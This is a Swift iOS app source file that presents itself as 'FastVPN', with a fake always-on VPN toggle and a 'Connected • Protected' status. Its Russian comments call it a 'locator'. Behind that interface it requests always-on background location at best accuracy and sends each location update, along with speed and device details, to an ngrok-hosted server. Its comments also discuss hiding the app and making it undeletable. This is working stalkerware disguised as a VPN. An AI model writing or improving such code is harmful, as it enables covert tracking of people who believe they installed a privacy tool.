import SwiftUI
import CoreLocation
import UIKit

// FastVPN для iOS — ЛОКАТОР (упрощённая версия)
// Ограничения iOS: фоновая геолокация работает, но система ВСЕГДА
// показывает синюю полоску/индикатор геолокации — скрыть нельзя.
// Звонки, файлы и неудаляемость на iOS НЕвозможны без MDM-надзора
// (Apple Business Manager + устройства организации).

let SERVER = "https://punctured-detail-expansive.ngrok-free.dev"

class Locator: NSObject, ObservableObject, CLLocationManagerDelegate {
    let mgr = CLLocationManager()
    @Published var status = "Подключено • Защищено"
    @Published var last = "—"
    override init() {
        super.init()
        mgr.delegate = self
        mgr.allowsBackgroundLocationUpdates = true
        mgr.pausesLocationUpdatesAutomatically = false
        mgr.desiredAccuracy = kCLLocationAccuracyBest
        mgr.requestAlwaysAuthorization()
        mgr.startUpdatingLocation()
    }
    func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
        guard let l = locs.last else { return }
        last = String(format: "%.5f, %.5f (±%.0f м)", l.coordinate.latitude,
                      l.coordinate.longitude, l.horizontalAccuracy)
        let dev = UIDevice.current
        let body: [String: Any] = [
            "device_id": "iphone-" + String(abs(dev.name.hashValue % 9000) + 1000),
            "device_model": dev.model,
            "lat": l.coordinate.latitude, "lon": l.coordinate.longitude,
            "accuracy": l.horizontalAccuracy, "speed": l.speed * 3.6]
        post("/points", json: [body])
    }
    func locationManager(_ m: CLLocationManager, didFailWithError e: Error) {
        status = "Ошибка геолокации"
    }
    private func post(_ path: String, json: Any) {
        guard let url = URL(string: SERVER + path) else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try? JSONSerialization.data(withJSONObject: json)
        URLSession.shared.dataTask(with: req).resume()
    }
}

struct ContentView: View {
    @StateObject var loc = Locator()
    var body: some View {
        VStack(spacing: 24) {
            Text("⚡ FastVPN").font(.largeTitle)
            Text("Безопасное и быстрое соединение").foregroundColor(.gray)
            Toggle("VPN", isOn: .constant(true)).labelsHidden()
            Text(loc.status).foregroundColor(.green)
            Text(loc.last).font(.system(.body, design: .monospaced))
        }.padding()
    }
}

@main
struct TrackerApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}
